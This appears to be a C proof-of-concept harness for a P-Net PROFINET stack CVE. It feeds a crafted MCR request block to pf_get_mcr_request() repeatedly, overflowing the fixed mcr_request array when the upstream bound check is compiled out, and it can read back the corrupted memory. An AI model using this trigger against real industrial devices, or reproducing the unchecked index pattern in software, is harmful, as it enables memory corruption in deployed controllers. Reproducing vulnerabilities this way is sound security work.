/* P-Net CVE-2026-127122 harness.
 *
 * Calls the REAL pinned pf_get_mcr_request() from src/device/pf_block_reader.c
 * on the REAL pinned pf_ar_t layout from src/pf_types.h. Each call models one
 * PF_BT_MCR_REQ block in pf_cmrpc_rm_connect_interpret_ind(): the index is
 * p_ar->nbr_mcr and the caller increments it only after a successful block.
 *
 * FIXED_CALLER adds the exact bound condition added by upstream v1.0.4 in
 * src/device/pf_cmrpc.c, case PF_BT_MCR_REQ:
 *     if (!(p_ar->nbr_mcr < PNET_MAX_MC_CR)) { ... reject ... } else { call }
 * The rejection code is reported here without the session/RPC scaffolding.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "pf_includes.h"
#include "pf_block_reader.h"


/* Unrelated helpers referenced by other functions in the same real source
 * file; the exercised pf_get_mcr_request() path does not call them. */
void pf_set_error (pnet_result_t * p_stat, uint8_t code, uint8_t decode,
                   uint8_t code_1, uint8_t code_2)
{
   (void)p_stat; (void)code; (void)decode; (void)code_1; (void)code_2;
}

int pf_cmdev_check_iocr_param (pf_ar_t * p_ar, pnet_result_t * p_stat)
{
   (void)p_ar; (void)p_stat;
   return 0;
}
#ifdef __SANITIZE_ADDRESS__
#define BLOCKS 40
#else
#define BLOCKS 2
#endif
#define NAME_LEN 16

int main (void)
{
   setvbuf (stdout, NULL, _IONBF, 0);
   pf_ar_t * p_ar = calloc (1, sizeof (*p_ar));
   uint8_t wire[8 + NAME_LEN];
   uint16_t pos;
   pf_get_info_t info;
   unsigned ix;
   unsigned accepted = 0;

   if (p_ar == NULL)
   {
      return 3;
   }

   /* Big-endian MCR block payload: iocr=0x4142, protocol=0x43,
    * resolution=0x44, timeout=0x4546, name_len=16, name=16*0x5a. */
   wire[0] = 0x41; wire[1] = 0x42; wire[2] = 0x43; wire[3] = 0x44;
   wire[4] = 0x45; wire[5] = 0x46; wire[6] = 0x00; wire[7] = NAME_LEN;
   memset (&wire[8], 0x5a, NAME_LEN);

   printf ("sizeof(pf_ar_t)=%zu sizeof(pf_multicast_cr_t)=%zu "
           "PNET_MAX_MC_CR=%d blocks=%d\n",
           sizeof (*p_ar), sizeof (p_ar->mcr_request[0]), PNET_MAX_MC_CR, BLOCKS);

   for (ix = 0; ix < BLOCKS; ix++)
   {
#ifdef FIXED_CALLER
      if (!(p_ar->nbr_mcr < PNET_MAX_MC_CR))
      {
         printf ("reject: block %u, nbr_mcr=%u, WRONG_BLOCK_COUNT\n",
                 ix, p_ar->nbr_mcr);
         break;
      }
#endif
      pos = 0;
      info.result = PF_PARSE_OK;
      info.is_big_endian = true;
      info.p_buf = wire;
      info.len = sizeof (wire);

      pf_get_mcr_request (&info, &pos, p_ar->nbr_mcr, p_ar);
      if (info.result != PF_PARSE_OK)
      {
         printf ("parse error at block %u: %d\n", ix, (int)info.result);
         break;
      }
      p_ar->nbr_mcr++;
      accepted++;
   }

   printf ("accepted=%u nbr_mcr=%u\n", accepted, p_ar->nbr_mcr);

#ifdef HARNESS_READBACK
   {
      pf_multicast_cr_t * slot = &p_ar->mcr_request[1];
      printf ("readback: slot1_offset=%td iocr=%04x protocol=%02x "
              "resolution=%02x timeout=%04x namelen=%u name=",
              (char *)slot - (char *)&p_ar->mcr_request[0],
              slot->iocr_reference,
              slot->address_resolution_properties.protocol,
              slot->address_resolution_properties.resolution_factor,
              slot->mci_timeout_factor,
              slot->length_provider_station_name);
      for (unsigned i = 0; i < NAME_LEN; i++)
      {
         printf ("%02x", (unsigned char)slot->provider_station_name[i]);
      }
      printf ("\n");
   }
#endif

#ifndef HARNESS_READBACK
   free (p_ar);
#endif
   return 0;
}
